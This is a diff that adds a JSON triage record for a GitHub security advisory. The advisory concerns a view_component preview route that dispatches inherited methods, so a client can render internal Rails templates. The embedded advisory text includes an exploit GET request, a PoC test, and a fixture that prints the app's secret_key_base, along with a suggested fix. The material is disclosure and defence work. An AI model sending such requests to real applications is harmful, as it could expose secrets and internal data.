@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/216992819?v=4\", \"events_url\": \"https://api.github.com/users/cyberlanc3r/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/cyberlanc3r/followers\", \"following_url\": \"https://api.github.com/users/cyberlanc3r/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/cyberlanc3r/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/cyberlanc3r\", \"id\": 216992819, \"login\": \"cyberlanc3r\", \"node_id\": \"U_kgDODO8MMw\", \"organizations_url\": \"https://api.github.com/users/cyberlanc3r/orgs\", \"received_events_url\": \"https://api.github.com/users/cyberlanc3r/received_events\", \"repos_url\": \"https://api.github.com/users/cyberlanc3r/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/cyberlanc3r/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/cyberlanc3r/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/cyberlanc3r\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-44836\", \"cvss\": {\"score\": 6.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 6.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-277\", \"name\": \"Insecure Inherited Permissions\"}, {\"cwe_id\": \"CWE-749\", \"name\": \"Exposed Dangerous Method or Function\"}], \"description\": \"### Summary\\n\\nThe preview route derives an example name from the URL and calls it with `public_send`. The code does not verify that the requested method is one of the preview examples explicitly defined by the preview class.\\n\\nAs a result, inherited public methods on `ViewComponent::Preview` are route-reachable. The most important one is `render_with_template`, which accepts `template:` and `locals:`. Those values can come from request params and are later passed to Rails as `render template:`.\\n\\nIf previews are exposed, an attacker can render internal Rails templates that are not otherwise routable.\\n\\nSeverity: High if preview routes are externally reachable; Medium otherwise.\\n\\nAffected files:\\n\\n- `lib/view_component/preview.rb`\\n- `app/controllers/concerns/view_component/preview_actions.rb`\\n- `app/views/view_components/preview.html.erb`\\n\\n\\n### Relevant Code\\n\\n`app/controllers/concerns/view_component/preview_actions.rb`:\\n\\n```ruby\\n@example_name = File.basename(params[:path])\\n@render_args = @preview.render_args(@example_name, params: params.permit!)\\n```\\n\\n`lib/view_component/preview.rb`:\\n\\n```ruby\\nexample_params_names = instance_method(example).parameters.map(&:last)\\nprovided_params = params.slice(*example_params_names).to_h.symbolize_keys\\nresult = provided_params.empty? ? new.public_send(example) : new.public_send(example, **provided_params)\\n```\\n\\n`app/views/view_components/preview.html.erb`:\\n\\n```erb\\n<%= render template: @render_args[:template], locals: @render_args[:locals] || {} %>\\n```\\n\\nThe UI only lists direct preview methods via:\\n\\n```ruby\\npublic_instance_methods(false).map(&:to_s).sort\\n```\\n\\nBut `render_args` does not enforce that list before dispatching.\\n\\n### Exploit Flow\\n\\nExample request:\\n\\n```text\\nGET /rails/view_components/my_component/render_with_template?template=internal/secret&locals[poc_local]=attacker-controlled-local&request_marker=attacker-controlled-request\\n```\\n\\nFlow:\\n\\n1. `my_component` resolves to a valid preview.\\n2. `File.basename(params[:path])` returns `render_with_template`.\\n3. `render_args` calls inherited `ViewComponent::Preview#render_with_template`.\\n4. Request params provide `template: \\\"internal/secret\\\"` and `locals: {...}`.\\n5. The preview view renders `internal/secret` with attacker-controlled locals.\\n\\nImpact depends on what internal templates render. In the worst case this can expose secrets, config, debug data, admin-only partials, or request/session-derived values.\\n\\n### PoC Test\\n\\nThis checkout already contains a PoC at:\\n\\n- `test/sandbox/test/security_preview_template_poc_test.rb`\\n- `test/sandbox/app/views/internal/secret.html.erb`\\n\\nThe test proves that `/internal/secret` is not directly routable, but can still be rendered through the preview endpoint by invoking inherited `render_with_template`.\\n\\nIf reproducing manually, run:\\n\\n```bash\\nbundle exec ruby -Itest test/sandbox/test/security_preview_template_poc_test.rb\\n```\\n\\nEquivalent standalone test:\\n\\n```ruby\\n# frozen_string_literal: true\\n\\nrequire \\\"test_helper\\\"\\n\\nclass SecurityPreviewTemplatePocTest < ActionDispatch::IntegrationTest\\n  def setup\\n    ViewComponent::Preview.__vc_load_previews\\n  end\\n\\n  def test_preview_route_can_invoke_inherited_render_with_template\\n    refute_includes MyComponentPreview.examples, \\\"render_with_template\\\"\\n\\n    assert_raises(ActionController::RoutingError) do\\n      Rails.application.routes.recognize_path(\\\"/internal/secret\\\")\\n    end\\n\\n    get(\\n      \\\"/rails/view_components/my_component/render_with_template\\\",\\n      params: {\\n        template: \\\"internal/secret\\\",\\n        locals: {poc_local: \\\"attacker-controlled-local\\\"},\\n        request_marker: \\\"attacker-controlled-request\\\"\\n      }\\n    )\\n\\n    assert_response :success\\n    assert_includes response.body, \\\"VC_PREVIEW_POC_SECRET=foo\\\"\\n    assert_includes response.body, \\\"VC_PREVIEW_POC_LOCAL=attacker-controlled-local\\\"\\n    assert_includes response.body, \\\"VC_PREVIEW_POC_REQUEST=attacker-controlled-request\\\"\\n  end\\nend\\n```\\n\\nFixture template:\\n\\n```erb\\n<div id=\\\"poc-secret\\\">VC_PREVIEW_POC_SECRET=<%= Rails.application.secret_key_base %></div>\\n<div id=\\\"poc-local\\\">VC_PREVIEW_POC_LOCAL=<%= local_assigns[:poc_local] || local_assigns[\\\"poc_local\\\"] %></div>\\n<div id=\\\"poc-request\\\">VC_PREVIEW_POC_REQUEST=<%= params[:request_marker] %></div>\\n```\\n\\n### Suggested Fix\\n\\nOnly dispatch explicitly declared preview examples:\\n\\n```ruby\\ndef render_args(example, params: {})\\n  example = example.to_s\\n  raise AbstractController::ActionNotFound unless examples.include?(example)\\n\\n  example_params_names = instance_method(example).parameters.map(&:last)\\n  provided_params = params.slice(*example_params_names).to_h.symbolize_keys\\n  result = provided_params.empty? ? new.public_send(example) : new.public_send(example, **provided_params)\\n  result ||= {}\\n  result[:template] = preview_example_template_path(example) if result[:template].nil?\\n  @layout = nil unless defined?(@layout)\\n  result.merge(layout: @layout)\\nend\\n```\\n\\nAdd a regression test that `/rails/view_components/my_component/render_with_template` fails unless `render_with_template` is explicitly defined as a preview example on that class.\", \"epss\": {\"percentage\": 0.00343, \"percentile\": 0.26526}, \"ghsa_id\": \"GHSA-7f3r-gwc9-2995\", \"github_reviewed_at\": \"2026-05-08T23:33:14Z\", \"html_url\": \"https://github.com/advisories/GHSA-7f3r-gwc9-2995\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-7f3r-gwc9-2995\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-44836\"}], \"nvd_published_at\": \"2026-05-26T21:16:38Z\", \"published_at\": \"2026-05-08T23:33:14Z\", \"references\": [\"https://github.com/ViewComponent/view_component/security/advisories/GHSA-7f3r-gwc9-2995\", \"https://github.com/rubysec/ruby-advisory-db/blob/master/gems/view_component/CVE-2026-44836.yml\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-44836\", \"https://github.com/advisories/GHSA-7f3r-gwc9-2995\"], \"repository_advisory_url\": \"https://api.github.com/repos/ViewComponent/view_component/security-advisories/GHSA-7f3r-gwc9-2995\", \"severity\": \"medium\", \"source_code_location\": \"https://github.com/ViewComponent/view_component\", \"summary\": \"view_component: Preview Route Can Dispatch Inherited Helper Methods\", \"type\": \"reviewed\", \"updated_at\": \"2026-06-08T23:34:28Z\", \"url\": \"https://api.github.com/advisories/GHSA-7f3r-gwc9-2995\", \"vulnerabilities\": [{\"first_patched_version\": \"4.9.0\", \"package\": {\"ecosystem\": \"rubygems\", \"name\": \"view_component\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \">= 3.0.0, < 4.9.0\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-7f3r-gwc9-2995",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "view_component: >= 3.0.0, < 4.9.0"
+    ],
+    "authentication_required": true,
+    "cves": [
+      "CVE-2026-44836"
+    ],
+    "cvss_score": 6.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "view_component"
+    ],
+    "remote": true,
+    "vendor_severity": "medium"
+  },
+  "first_seen_at": "2026-07-20T19:52:00.142701Z",
+  "provenance": {
+    "content_sha256": "dc3896f31313a4004dcc24561f8e814433dc3af0ce919d7d805fd0ca51d7e8ec",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-05-08T23:33:14Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-7f3r-gwc9-2995",
+  "status": "active",
+  "title": "view_component: Preview Route Can Dispatch Inherited Helper Methods",
+  "updated_at": "2026-06-08T23:34:28Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-7f3r-gwc9-2995"
+}
